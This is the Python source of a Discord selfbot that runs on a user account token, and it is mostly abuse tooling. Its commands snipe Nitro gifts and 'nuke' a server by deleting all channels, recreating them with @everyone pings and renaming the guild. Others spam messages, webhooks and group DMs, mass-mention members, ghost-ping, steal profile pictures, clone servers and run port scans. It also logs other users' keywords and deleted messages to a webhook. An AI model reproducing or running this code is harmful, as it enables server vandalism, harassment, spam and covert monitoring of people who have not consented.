from discord_webhook import DiscordWebhook
from brainfuckery import Brainfuckery
from modules.youtubeclass import *
from discord.ext import commands
from modules.functions import *
from modules.variables import *
import morse_talk as mtalk
from textwrap import wrap
import randfacts
import requests
import pyfiglet
import discord
import random
import string
import base64
import qrcode
import socket
import openai
import time
import json
import os

# Bot stuff
bot = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None)


# When bot is loaded
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')  # cls or clear depends on os

    print(ascii)
    print(f'''
    {s}Nitro Sniper: {fyell}{sniper_status}{frese}          Selfbot Catcher: {fyell}{catcher_status}{frese}
    {s}Word Stalker: {fyell}{stalker_status}{frese}          Mention AI: {fyell}{ai_status}{frese}
    
    {s}Logged in as {flgree}{bot.user}{frese}          Prefix: {flblue}{prefix}{frese}
                {xs}____________________________________________________________________''')
    print('')


# When command fails
@bot.event
async def on_command_error(ctx, arg):  # When command fails
    print(
        f'    {flyell}{ctx.message.author} | {flred}[ERROR]{frese} {ctx.message.content} {flmage}-> {flred}[{arg}]{frese}')
    try:
        trn = get_time()
        f.write(f'[{trn}] ERROR: {ctx.message.content} -> {arg}\n')
    except UnicodeEncodeError:
        return


# When command was runned
@bot.event
async def on_command(ctx):  # When command is completed
    print(f'    {flyell}{ctx.message.author} | {flcyan}[COMMAND]{frese} {ctx.message.content}')
    try:
        trn = get_time()
        f.write(f'[{trn}] COMMAND RAN BY {ctx.message.author} -> {ctx.message.content}\n')
    except UnicodeEncodeError:
        return


# When guild has been added to account
@bot.event
async def on_guild_join(guild):
    print(f'    {fblue}Joins | {flblue}[EVENT]{frese} Guild {guild.name} has been {fgree}added{frese}')
    try:
        trn = get_time()
        f.write(f'[{trn}] JOIN: Guild {guild.name} has been added\n')
    except UnicodeEncodeError:
        return


# When guild has been removed from the account
@bot.event
async def on_guild_remove(guild):
    print(f'    {flred}LEAVE | {flblue}[EVENT]{frese} Guild {guild.name} has been {fred}removed{frese}')
    try:
        trn = get_time()
        f.write(f'[{trn}] LEAVE: Guild {guild.name} has been removed\n')
    except UnicodeEncodeError:
        return


# When message is deleted
@bot.event
async def on_message_delete(message):
    if message.author == bot.user:
        return
    log_event(webhook, f'[{trn}] {message.author}\'s MESSAGE HAS BEEN DELETED -> \n{message.content}')


# Nitro sniper, Selfbot-Catcher and Word Stalker, Mention AI, Secret Command
@bot.listen()
async def on_message(message):
    if grouplock:
        if message.channel.id == grouplock_group:

            tempmembers = []
            for item in gmembers:
                tempmembers.append(item)

            t_members = requests.get(f"https://discord.com/api/v10/channels/{grouplock_group}",
                                     headers={
                                         "authorization": token}).json()

            for cmember in t_members['recipients']:
                if cmember['id'] in tempmembers:
                    tempmembers.remove(cmember['id'])

            else:
                for id in tempmembers:
                    url = f'https://discord.com/api/v10/channels/{grouplock_group}/recipients/{id}'
                    r = requests.put(url, headers={
                        "authorization": token})
                    if r.status_code != 204:
                        print(
                            f'    {flyell}Grouplocker | {flred}[ERROR]{frese} Status code is not 204 but it is {r.status_code}')

                    tempmembers.remove(id)

    msg = message.content
    code = ''
    status = ''
    if nitro_sniper:
        if 'discord.gift/' in msg:
            code = re.search("discord.gift/(.*)", msg).group(1)

            headers = {
                'Authorization': token}
            r = requests.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                              headers=headers).text

            if 'This gift has been redeemed already.' in r:
                status = 'Already redeemed!'

            elif 'subscription_plan' in r:
                status = 'Succesfully redeemed!'

            elif 'Unknown Gift Code' in r:
                status = 'Invalid code!'

            nitro_info = f'''
                     {flblue}<+==================================================================================+>

                                 {flred}Link:{flcyan} {msg}
                                 {flred}Code:{flcyan} {code}
                                 {flred}Status:{flyell} {status}
                                 {flred}Sent by:{flcyan} {message.author}

                    {flblue}<+==================================================================================+>{frese}
        '''
            print(f'{nitro_info}')
            trn = get_time()
            log_event(webhook, f'[{trn}] NITRO: {code}, {status}, {message.author}')
            f.write(f'[{trn}] NITRO: {code}, {status}, {message.author}\n')

    if f'{prefix} <@{discord_id}>' in msg:
        if mention_ai:
            if len(msg) < 500:
                openai.api_key = openai_key

                question = msg.replace(f'{prefix} <@{discord_id}>', '')
                model_engine = "text-davinci-003"

                asker = message.author.mention
                if asker == f'<@{discord_id}>':
                    asker = f'{bot.user}'

                # Generate a response
                completion = openai.Completion.create(
                    engine=model_engine,
                    prompt=question,
                    max_tokens=1024,
                    n=1,
                    stop=None,
                    temperature=0.5,
                )

                response = completion.choices[0].text

                if len(response) > 1700:
                    messages = wrap(response, 1700)
                    for messagez in messages:
                        await message.channel.send(f'''**>** __***{asker}***__ ```yml
{messagez}
```''')
                else:
                    await message.channel.send(f'''**>** __***{asker}***__ ```yml
{response}
```''')

    if message.author == bot.user:
        if msg == 'ngl i kinda like this server':
            print(f'     {flcyan}[SECRET COMMAND]{frese} Show roles')
            server = message.guild
            for role in server.roles:
                print(
                    f'    {flyell}Role mention:{flcyan} <@&{role.id}>{frese} | {flyell}Role name:{fcyan} {role.name}{frese}')

        elif msg == 'this server has nice members':
            print(f'     {flcyan}[SECRET COMMAND]{frese} Bot compiler mention')
            server = message.guild
            print('--------------------------------------------')
            print(f'Code: \n{fyell}``')
            for role in server.roles:
                print(f'<@&{role.id}>')
            else:
                print(f'# github.com/wfsecs{frese}')
                print('--------------------------------------------')

    if selfbot_catcher:
        if message.author == bot.user:
            return

        for x in prefixes:
            if msg.startswith(x):
                print(
                    f'    {flwhit}{message.guild} {flcyan}#{message.channel} {flyell}|{frese} Selfbot Catcher {flblue}[FOUND]{fyell} {message.author} {flyell}is probably using a selfbot.{frese} Reason: {fmage}"{flred}{x}{fmage}"{flyell} is in the message.{frese}')
                try:
                    trn = get_time()
                    log_event(webhook,
                              f'[{trn}] SELFBOT-CATCHER: {message.author} is probably using a selfbot. Reason: "{x}" is in the message. \n --> {message.content[0:30]}')
                    f.write(
                        f'[{trn}] SELFBOT-CATCHER: {message.author} is probably using a selfbot. Reason: "{x}" is in the message.\n')

                except UnicodeEncodeError:
                    return

        if message.embeds:
            if message.author.bot:
                return
            else:
                print(
                    f'    {flwhit}{message.guild} {flcyan}#{message.channel} {flyell}|{frese} Selfbot Catcher {flblue}[FOUND]{fyell} {message.author} {flyell}is using a selfbot.{frese} Reason: {fred}Message is an embed.{frese}')
                try:
                    trn = get_time()
                    log_event(webhook,
                              f'[{trn}] SELFBOT-CATCHER: {message.author} is using a selfbot. Reason: Message is an embed.')
                    f.write(
                        f'[{trn}] SELFBOT-CATCHER: {message.author} is using a selfbot. Reason: Message is an embed.\n')
                except UnicodeEncodeError:
                    return

    if word_stalker:
        if message.author == bot.user:
            return
        for word in keywords:
            if word in msg:
                print(
                    f'    {message.guild} {flcyan}#{message.channel} {fyell}{message.author} {flyell}|{frese} Word Stalker {flblue}[FOUND]{fred} "{word}" {flyell}is in the message:{frese} {message.content[0:15]}...')
                try:
                    trn = get_time()
                    log_event(webhook,
                              f'[{trn}] WORD-STALKER: {message.guild} {message.author} "{word}" is in the message: {message.content}')
                    f.write(
                        f'[{trn}] WORD-STALKER: {message.guild} {message.author} "{word}" is in the message: {message.content}\n')
                except UnicodeEncodeError:
                    return


@bot.command(aliases=['commands'])
async def help(ctx):  # Help command
    await ctx.message.delete()

    sex20 = f'''[10][0;34m [Bot][0m
[0;31m1.[0m[0;36m   quickload [1;37m(Loads the console)[0;35m,
[0;31m2.[0m[0;36m   nitrosniper [0;30m<on || off> [1;37m(Loads the console)[0;35m,
[0;31m3.[0m[0;36m   selfbotcatcher [0;30m<on || off> [1;37m(Turn selfbot-catcher on or off)[0;35m,
[0;31m4.[0m[0;36m   wordstalker [0;30m<on || off> [1;37m(Turn Word Stalker on or off)[0;35m,
[0;31m5.[0m[0;36m   mentionai [0;30m<on || off> [1;37m(Turn Mention AI on or off)[0;35m,

[0;31m6.[0m[0;36m   User:[1;37m {bot.user}[0;35m,
[0;31m7.[0m[0;36m   Prefix:[1;37m {prefix}
[0;31m8.[0m[0;36m   Nitro Sniper:[1;37m {sniper_status}[0;35m,
[0;31m9.[0m[0;36m   Selfbot Catcher:[1;37m {catcher_status}[0;35m,
[0;31m10.[0m[0;36m  Word Stalker:[1;37m {stalker_status}[0;35m,
[0;31m11.[0m[0;36m  Mention AI:[1;37m {ai_status}[0;35m,'''

    await ctx.send(f'''```ansi
    {sex1}```''')

    await ctx.send(f'''```ansi
    {sex2}```''')

    await ctx.send(f'''```ansi
    {sex3}```''')

    await ctx.send(f'''```ansi
    {sex32}```''')

    await ctx.send(f'''```ansi
    {sex4}```''')

    await ctx.send(f'''```ansi
    {sex41}```''')

    await ctx.send(f'''```ansi
    {sex5}```''')

    await ctx.send(f'''```ansi
    {sex6}```''')

    await ctx.send(f'''```ansi
    {sex7}```''')

    await ctx.send(f'''```ansi
    {sex8}```''')

    await ctx.send(f'''```ansi
    {sex9}```''')

    await ctx.send(f'''```ansi
    {sex20}```''')


@bot.command(aliases=['txt2bin'])  # Text to binary command
async def text2bin(ctx, arg):
    await ctx.message.delete()

    bin_result = ''.join(format(ord(x), '08b') for x in arg)
    await ctx.send(f'''```ansi
[0;31mText:[0m[0;36m {arg}[0;35m
[0;31mBinary:[0m[0;36m {bin_result}
```''')


@bot.command(aliases=['txt2hex'])  # Text to hex command
async def text2hex(ctx, arg):
    await ctx.message.delete()

    str = arg.encode('utf-8')
    output = str.hex()

    await ctx.send(f'''```ansi
[0;31mText:[0m[0;36m {arg}[0;35m
[0;31mHex:[0m[0;36m {output} 
```''')


@bot.command(aliases=['base64decode'])  # Decode Base64 command
async def decode(ctx, arg):
    await ctx.message.delete()

    outputin = base64.b64decode(arg)
    await ctx.send(f'''```ansi
[0;31mBase64:[0m[0;36m {arg}[0;35m
[0;31mText:[0m[0;36m {outputin}
```''')


@bot.command(aliases=['base64encode', 'base64'])  # Encode text to Base64 command
async def encode(ctx, arg):
    await ctx.message.delete()

    message_bytes = arg.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    encode = base64_bytes.decode('ascii')
    await ctx.send(f'''```ansi
[0;31mText:[0m[0;36m {arg}[0;35m
[0;31mBase64:[0m[0;36m {encode}
```''')


@bot.command()  # Rock, Paper, Scissors command
async def rps(ctx, arg):
    bot_choice = random.choice(rockpaperstone)
    Challenger = bot.user
    Ai_Challenger = 'Bot'

    if arg == bot_choice:
        win = 'Tie'
        await ctx.send(f'''```ansi
        [0;31mYour choice:[0m[0;36m {arg}[0;35m
        [0;31mBot choice:[0m[0;36m {bot_choice}
            [0;33m{win}```''')
    elif arg == "rock":
        if bot_choice == "scissors":
            win = f'{Challenger} wins!'
            await ctx.send(f'''```ansi
            [0;31mYour choice:[0m[0;36m {arg}[0;35m
            [0;31mBot choice:[0m[0;36m {bot_choice}
                [0;33m{win}```''')
        else:
            win = f'{Ai_Challenger} wins!'
            await ctx.send(f'''```ansi
            [0;31mYour choice:[0m[0;36m {arg}[0;35m
            [0;31mBot choice:[0m[0;36m {bot_choice}
                [0;33m{win}```''')
    elif arg == "paper":
        if bot_choice == "rock":
            win = f'{Challenger} wins!'
            await ctx.send(f'''```ansi
            [0;31mYour choice:[0m[0;36m {arg}[0;35m
            [0;31mBot choice:[0m[0;36m {bot_choice}
                [0;33m{win}```''')
        else:
            win = f'{Ai_Challenger} wins!'
            await ctx.send(f'''```ansi
            [0;31mYour choice:[0m[0;36m {arg}[0;35m
            [0;31mBot choice:[0m[0;36m {bot_choice}
                [0;33m{win}
            ```''')
    elif arg == "scissors":
        if bot_choice == "paper":
            win = f'{Challenger} wins!'
            await ctx.send(f'''```ansi
            [0;31mYour choice:[0m[0;36m {arg}[0;35m
            [0;31mBot choice:[0m[0;36m {bot_choice}
                [0;33m{win}```''')


@bot.command()  # Dice command
async def dice(ctx):
    await ctx.send(f'''```ansi
[0;31mNumber:[0m[0;36m {random.randint(1, 6)}[0;35m
```''')


@bot.command()  # Purge messages command
async def purge(ctx, arg):
    await ctx.message.delete()

    async for msg in ctx.message.channel.history(limit=int(arg)):
        if msg.author.id == bot.user.id:
            time.sleep(0.1)
            try:
                await msg.delete()
            except:
                continue


@bot.command()  # Measure Dick size command
async def dick(ctx, user: discord.Member = None):
    size = random.randint(2, 30)
    amount = repeat_to_length('=', int(size))
    await ctx.send(f'*__{user.mention}__\'s dick size:* ***`8{amount}D`***')


@bot.command(aliases=['random_fact'])  # Random fact command
async def fact(ctx):
    fact = randfacts.get_fact()
    await ctx.send(f'***`{fact}`***')


@bot.command(aliases=['iplookup'])  # Lookup ip command
async def lookup(ctx, arg):
    ip_info = iplookup_func(arg)
    await ctx.send(ip_info)


@bot.command(aliases=['coinflip'])  # Coin flip
async def coin_flip(ctx):
    options = ['Heads', 'Tails']
    bot_flip = random.choice(options)
    await ctx.send(f'**`{bot_flip}`**')


@bot.command()  # Poll command
@commands.has_permissions(add_reactions=True)
async def poll(ctx, arg):
    await ctx.message.delete()

    message = await ctx.send(f'*`{arg}`*')
    for emoji in emojis:
        await message.add_reaction(emoji)


@bot.command(aliases=['voidwall'])  # Clear command
async def clear(ctx):
    await ctx.message.delete()

    await ctx.send(big_wall)
    time.sleep(0.2)
    await ctx.send(big_wall)


@bot.command(aliases=['emptymsg'])  # Empty message command
async def empty_msg(ctx):
    await ctx.message.delete()
    await ctx.send(empty1_mesg)


@bot.command(aliases=['ghostping', 'ghost_ping'])  # Ghost ping command
async def gping(ctx, arg1, arg2):
    await ctx.message.delete()

    ghost_ping = f'''{arg1} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {arg2}'''
    await ctx.send(ghost_ping)


@bot.command(aliases=['fakeurl'])  # Fake url command
async def fake_url(ctx, arg1, arg2):
    await ctx.message.delete()

    fake_url = f'''<{arg1}> ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {arg2}'''
    await ctx.send(fake_url)


@bot.command(aliases=['8ball'])  # 8ball command
async def ball(ctx):
    response = random.choice(ball_responses)
    await ctx.send(f'***`8ball says: {response}`***')


@bot.command(aliases=['randomnum'])  # Random number command
async def randint(ctx, arg1, arg2):
    number = random.randint(int(arg1), int(arg2))
    await ctx.send(f'***`Random number: {number}`***')


@bot.command()  # Edit command
async def edit(ctx, arg1, arg2):
    async for msg in ctx.message.channel.history(limit=int(arg1)):
        if msg.author.id == bot.user.id:
            await msg.edit(content=arg2)


@bot.command(aliases=['text2qr'])  # Text to QR Code command
async def txt2qr(ctx, arg):
    await ctx.message.delete()

    img = qrcode.make(arg)
    type(img)
    img.save("QR.png")
    await ctx.send(file=discord.File('QR.png'))
    os.remove("QR.png")


@bot.command()  # I see who you are command
async def icwhour(ctx):
    await ctx.message.delete()
    message = await ctx.send(f'I see who you are...')
    for retard in enemy:
        time.sleep(1.5)
        await message.edit(content=retard)


@bot.command(aliases=['mkserver'])  # Create servers command
async def create_server(ctx, arg1, arg2):
    for x in range(int(arg1)):
        await bot.create_guild(arg2)


@bot.command(aliases=['dmfriends'])  # DM friends command
async def dm_friends(ctx, arg):
    for user in bot.user.friends:
        time.sleep(0.5)
        await user.send(arg)


@bot.command()  # Expose bots command
async def expose_bots(ctx):
    await ctx.message.delete()
    bot.remove_command('help')
    for expose_cmd in expose_commands:
        time.sleep(0.5)
        expose_msg = await ctx.send(expose_cmd)
        time.sleep(1.2)
        await expose_msg.delete()
    bot.add_command(bot.command('help'))


@bot.command(aliases=['portscan', 'port_scan'])  # Port scan command
async def pscan(ctx, arg):
    ss = portscan_ip(arg)
    await ctx.send(f'''```ansi
    {ss}```''')


@bot.command(aliases=['statuscode'])  # Get status code command
async def status_code(ctx, arg):
    r = requests.get(arg)
    await ctx.send(f'**`Status code: {r.status_code}`**')


@bot.command(aliases=['myping'])  # Ping command
async def ping(ctx):
    before = time.monotonic()
    message = await ctx.send("Pong!")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"*Pong!* ***__`{int(ping)}ms`__***")


@bot.command(aliases=['makechannels'])  # Make channels command
@commands.has_permissions(manage_channels=True)
async def mk_channels(ctx, arg1, arg2):
    guild = ctx.message.guild
    amount = int(arg1)
    for x in range(amount):
        if arg2 == 'random':
            name = random.choice(channel_names)
            await guild.create_text_channel(name)
        else:
            await guild.create_text_channel(arg2)


@bot.command(aliases=['delchannels'])  # Delete channels command
@commands.has_permissions(manage_channels=True)
async def del_channels(ctx):
    for c in ctx.guild.channels:
        await c.delete()


@bot.command(aliases=['name_channels'])  # Rename channels command
@commands.has_permissions(manage_channels=True)
async def rename_channels(ctx, arg):
    for c in ctx.guild.channels:
        await c.edit(name=arg)


@bot.command()  # Nuke command
@commands.has_permissions(manage_guild=True)
async def nuke(ctx, arg1, arg2):
    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild
    amount = int(arg1)
    for x in range(amount):
        channel = await guild.create_text_channel(arg2)
        await channel.send('@everyone')

    await ctx.guild.edit(name='wfsecs kingdom')


@bot.command(aliases=['bomb', 'nuke_animation'])  # Jeriko bomb command
async def jeriko_bomb(ctx):
    message = await ctx.send(f'''
```ansi
[30m
        |\**/|      
        | == |
         |  |
         |  |
         \  /
          \/
.
.
.
```
''')
    time.sleep(0.4)
    await message.edit(content='''
```ansi
[30m
        |\**/|      
        | == |
         |  |
         |  |
         \  /
          \/
.
.
```
''')

    time.sleep(0.4)
    await message.edit(content='''
    ```ansi
    [30m
        |\**/|      
        | == |
         |  |
         |  |
         \  /
          \/
.
    ```
    ''')

    time.sleep(0.4)
    await message.edit(content='''
    ```ansi
    [30m
        |\**/|      
        | == |
         |  |
         |  |
         \  /
          \/
    ```
    ''')

    time.sleep(0.4)
    await message.edit(content='''
    ```ansi
    [31m
          _ ._  _ , _ ._
        (_ ' ( `  )_  .__)
      ( (  (    )   `)  ) _)
     (__ (_   (_ . _) _) ,__)
         `~~`\ ' . /`~~`
              ;   ;
              /   \|
_____________/_ __ \_____________
    ```
    ''')

    time.sleep(0.4)
    await message.edit(content='''
        ```ansi
        [33m
                             ____
                     __,-~~/~    `---.
                   _/_,---(      ,    )
               __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===----- -  -
                  \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                        (` ^'"`-' ")
        ```
        ''')

    time.sleep(0.4)
    await message.edit(content='''
            ```ansi
            [33m
                               ________________
                          ____/ (  (    )   )  \___
                         /( (  (  )   _    ))  )   )\_
                       ((     (   )(    )  )   (   )  )
                     ((/  ( _(   )   (   _) ) (  () )  )
                    ( (  ( (_)   ((    (   )  .((_ ) .  )_
                   ( (  )    (      (  )    )   ) . ) (   )
                  (  (   (  (   ) (  _  ( _) ).  ) . ) ) ( )
                  ( (  (   ) (  )   (  ))     ) _)(   )  )  )
                 ( (  ( \ ) (    (_  ( ) ( )  )   ) )  )) ( )
                  (  (   (  (   (_ ( ) ( _    )  ) (  )  )   )
                 ( (  ( (  (  )     (_  )  ) )  _)   ) _( ( )
                  ((  (   )(    (     _    )   _) _(_ (  (_ )
                   (_((__(_(__(( ( ( |  ) ) ) )_))__))_)___)
                   ((__)        \.\||lll|l||///          \_))
                            (   /(/ (  )  ) )\   )
                          (    ( ( ( | | ) ) )\   )
                           (   /(| / ( )) ) ) )) )
                         (     ( ((((_(|)_)))))     )
                          (      ||\(|(|)|/||     )
                        (        |(||(||)||||        )
                          (     //|/l|||)|\.\ \     )
                        (/ / //  /|//||||\.\  \ \  \ _)
            ```
            ''')


@bot.command(aliases=['groupspam', 'group_spam'])  # Group spam command
async def gspam(ctx, arg1, arg2):
    headers = {
        "Authorization": token,
        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31"

    }
    amount = int(arg1)
    for x in range(amount):
        r = requests.post('https://discord.com/api/v10/users/@me/channels', headers=headers,
                          json={
                              "recipients": [discord_id, arg2]})

        json_resp = json.loads(r.content)
        group_id = json_resp['id']

        requests.delete(f'https://discord.com/api/v10/channels/{group_id}/recipients/{discord_id}',
                        headers=headers)


@bot.command()  # Activity command
async def activity(ctx, arg):
    await bot.change_presence(activity=discord.Game(name=arg))


@bot.command(aliases=['delhook'])  # Delete webhook command
async def delete_webhook(ctx, arg):
    requests.delete(arg)


@bot.command(aliases=['show_channels'])  # Show channels command
async def channels(ctx):
    channels = ''
    for channel in ctx.message.guild.text_channels:
        channels += f'  # {channel.name}\n'
    await ctx.send(f'''```ansi
[0;34m{channels}
```''')


@bot.command()  # Spam command
async def spam(ctx, arg1, arg2):
    amount = int(arg1)
    for x in range(amount):
        time.sleep(0.05)
        await ctx.send(arg2)


@bot.command()  # Domain2IP command
async def domain2ip(ctx, arg):
    ip = socket.gethostbyname(arg)
    await ctx.send(f'`IP: {ip}`')


@bot.command()  # ID info command
async def idinfo(ctx, arg):
    user_data = get_discord_data(token, arg)
    await ctx.send(user_data)


@bot.command()  # Steal PFP command
async def stealpfp(ctx, arg1, user: discord.Member = None):
    user_pfp = get_pfp(token, user.id)

    if arg1 == 'use':
        fp = open(user_pfp, 'rb')
        pfp = fp.read()

        await bot.user.edit(password=password, avatar=pfp)


@bot.command(aliases=['webspam'])  # Spam webhook command
async def webhook_spam(ctx, arg1, arg2, arg3):
    amount = int(arg1)
    message_command = ctx.message
    webhook = DiscordWebhook(url=arg3, rate_limit_retry=True,
                             content=arg2)

    amount += 1

    for x in range(amount):
        await message_command.edit(content=f'**`Sent: {x} messages.`**')
        webhook.execute()


@bot.command()  # Hypesquad badge changer
async def hypesquad(ctx, arg):
    hypesquad = int(arg)

    headers = {
        'authorization': token
    }

    body = {
        'house_id': hypesquad
    }

    meResponse = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)

    response = requests.post('https://discord.com/api/v9/hypesquad/online', headers=headers, json=body)

    if response.status_code == 204:
        await ctx.send('**`Changed badge succesfully!`**')

    elif response.status_code == 401:
        await ctx.send('**`Changing badge has failed: 401`**')

    elif response.status_code == 429:
        await ctx.send('**`Changing badge has failed: Rate limited (429)`**')


@bot.command()  # Big spoiler command
async def spoilers(ctx, arg):
    await ctx.message.delete()
    msg = ''
    for char in arg:
        msg = f'{msg}||{char}||'

    await ctx.send(msg)


@bot.command(aliases=['lagspam', 'lagemoji', 'emojilag'])  # Big emoji bomb
async def emoji_spam(ctx, arg):
    amount = int(arg)
    await ctx.message.delete()

    for x in range(amount):
        time.sleep(0.5)
        await ctx.send(emoji_bomb)


@bot.command(aliases=['invisible_ping', 'pingsound'])  # Mystery ping
async def mysteryping(ctx, arg):
    await ctx.message.delete()
    amount = int(arg)

    for _ in range(amount):
        try:
            ping = await ctx.send(empty1_mesg)
            time.sleep(0.02)
            await ping.delete()
        except:
            pass


@bot.command(aliases=['massmention'])  # Ping server memberos
async def mass_mention(ctx, arg):
    guild = ctx.message.guild

    amount = int(arg)

    await ctx.message.delete()
    members = ''

    for member in guild.members:
        if not member.bot:
            members += f'{member.mention}'

    n = 2000

    pings = wrap(members, 2000)

    for _ in range(amount):
        for ping in pings:
            await ctx.send(ping)


@bot.command(aliases=['ping_everyone'])  # Ping everyone even without perms
async def pinghack(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    members = ''

    for member in guild.members:
        if not member.bot:
            members += f'{member.mention}'

    everyoneping = f'''@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {members}'''
    await ctx.send(everyoneping[0:2000])


@bot.command(aliases=['ghostmode'])  # Ping server memberos
async def invisible(ctx):
    blank_pfp = 'avatars/blank.png'  # pfp file location

    fp = open(blank_pfp, 'rb')
    pfp = fp.read()
    await bot.user.edit(password=password, avatar=pfp, username='ٴٴٴٴ', status=discord.Status.invisible)


@bot.command(aliases=['yellow_wall'])  # Ping server memberos
async def piss(ctx, user: discord.Member = None):
    await ctx.message.delete()
    await ctx.send(f'{user.mention} {big_wall}')


@bot.command()  # Clones server
async def clone_server(ctx):
    await ctx.message.delete()
    server = ctx.message.guild
    roles = server.roles

    guild = await bot.create_guild(ctx.message.guild.name)

    for cg in server.categories:
        category = await guild.create_category(cg.name)

        for channel in cg.channels:
            if isinstance(channel, discord.VoiceChannel):
                vc = await category.create_voice_channel(channel.name)
                overwrites = channel.overwrites
                await vc.edit(overwrites=overwrites)

            if isinstance(channel, discord.TextChannel):
                cha = await category.create_text_channel(channel.name)
                overwrites = channel.overwrites
                await cha.edit(overwrites=overwrites)

    for role in roles:
        role = await guild.create_role(name=role.name,
                                       permissions=discord.Permissions(permissions=role.permissions.value))

    try:
        await guild.edit(icon=ctx.message.guild.icon)
    except:
        pass


@bot.command()  # Show morse alphabet
async def morsetable(ctx):
    await ctx.send(morsetableo1)


@bot.command()  # Show morse alphabet
async def brainfuck(ctx, arg):
    result = Brainfuckery().convert(arg)
    await ctx.send(f'''```brainfuck
{result}```''')


@bot.command(aliases=['find_name'])  # Show users that name starts with x
async def namestarts(ctx, arg):
    mlist = ''

    guild = ctx.message.guild
    for member in guild.members:
        name = member.name
        if name.startswith(arg):
            mlist += f'{name}#{member.discriminator}\n'

    await ctx.send(f'''```{mlist}```''')


@bot.command(aliases=['find_tag'])  # Show users that have specific discriminator
async def tagfind(ctx, arg):
    mlist = ''

    guild = ctx.message.guild
    for member in guild.members:
        discriminator = member.discriminator

        if discriminator == arg:
            mlist += f'{member.name}#{discriminator}\n'

    await ctx.send(f'''```{mlist}```''')


@bot.command(aliases=['theme_dark'])  # Changes theme to dark
async def dark(ctx):
    headers = {
        'authorization': token,
        'content-type': 'application/json'
    }

    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, data=json.dumps({
                                                                                                         "theme": "dark"}))


@bot.command(aliases=['theme_light'])  # Changes theme to light
async def light(ctx):
    headers = {
        'authorization': token,
        'content-type': 'application/json'
    }

    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers,
                   data=json.dumps({
                                       "theme": "light"}))


@bot.command()  # Annoys the chat
async def annoy(ctx):
    sz = await ctx.send(smaller_wall)
    for x in range(10):
        await sz.edit(content=empty1_mesg)
        await sz.edit(content=smaller_wall)
        await sz.edit(content=empty1_mesg)


@bot.command()  # countdown
